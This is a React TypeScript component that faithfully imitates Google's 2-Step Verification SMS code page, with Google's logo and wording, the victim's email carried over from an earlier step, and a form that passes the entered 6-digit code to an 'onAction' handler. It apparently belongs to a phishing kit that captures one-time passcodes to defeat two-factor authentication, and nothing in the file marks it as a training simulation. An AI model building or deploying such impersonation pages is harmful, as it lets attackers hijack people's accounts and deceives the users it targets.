import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';

interface GmailSmsCodePageProps {
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

const GoogleLogo = () => (
  <svg viewBox="0 0 48 48" className="h-10 w-10" xmlns="http://www.w3.org/2000/svg">
    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
  </svg>
);

const GmailSmsCodePage: React.FC<GmailSmsCodePageProps> = ({ onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const phoneNumber = (data.phoneNumber as string) || (data.phone as string) || 'the phone number on file';

  const [code, setCode] = useState('');
  const [submitting, setSubmitting] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length !== 6 || submitting) return;
    setSubmitting(true);
    onAction('submit_sms', { code });
  };

  return (
    <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]">
      <main className="flex-grow w-full flex items-center justify-center p-4">
        <div
          className="w-full max-w-[960px] mx-auto bg-white rounded-[28px] px-10 md:px-14 py-10 md:py-12"
          style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}
        >
          <form onSubmit={handleSubmit}>
            <div className="flex flex-col md:flex-row md:gap-16">
              <div className="md:w-1/2 md:pt-4">
                <GoogleLogo />
                <h1 className="text-[36px] leading-[44px] font-normal text-gray-900 mt-8">2-Step Verification</h1>
                <p className="text-[16px] leading-6 text-gray-900 mt-4 max-w-md">
                  To help keep your account safe, Google wants to make sure it&rsquo;s really you trying to sign in.
                </p>
                {email && (
                  <div className="mt-6">
                    <button type="button" className="inline-flex items-center space-x-2 px-2 py-1 border border-gray-300 rounded-full">
                      <div className="w-7 h-7 rounded-full bg-blue-600 flex items-center justify-center text-white text-xs font-semibold">
                        {email.charAt(0).toUpperCase()}
                      </div>
                      <span className="text-sm text-gray-800 pr-1">{email}</span>
                    </button>
                  </div>
                )}
              </div>

              <div className="md:w-1/2 mt-10 md:mt-0 flex flex-col">
                <h2 className="text-[18px] text-gray-900 font-normal mb-2">Get a verification code</h2>
                <p className="text-sm text-gray-700 mb-6">
                  A text message with a 6-digit verification code was sent to <strong>{phoneNumber}</strong>.
                </p>
                <label className="block text-xs text-gray-600 mb-1">Enter the code</label>
                <input
                  type="tel"
                  inputMode="numeric"
                  autoComplete="one-time-code"
                  value={code}
                  onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                  maxLength={6}
                  autoFocus
                  className="w-full px-3 py-3 text-lg tracking-[0.4em] bg-transparent border border-gray-400 rounded-md outline-none focus:border-blue-600 focus:border-2"
                />
                <label className="flex items-center mt-4 text-sm text-gray-700">
                  <input type="checkbox" className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500" />
                  <span className="ml-2">Don&rsquo;t ask again on this device</span>
                </label>
                <div className="flex justify-between items-center mt-12">
                  <button
                    type="button"
                    onClick={() => onAction('resend_sms')}
                    className="text-sm font-semibold text-blue-600 hover:underline"
                  >
                    Resend code
                  </button>
                  <div className="flex items-center gap-4">
                    <button
                      type="button"
                      onClick={() => { onAction('cancel'); navigate(-1); }}
                      className="text-sm font-semibold text-blue-600 hover:underline"
                    >
                      Try another way
                    </button>
                    <button
                      type="submit"
                      disabled={code.length !== 6 || submitting}
                      className="px-6 py-2.5 bg-blue-600 text-white text-sm font-semibold rounded-full hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      {submitting ? 'Verifying\u2026' : 'Next'}
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </form>
        </div>
      </main>
    </div>
  );
};

export default GmailSmsCodePage;
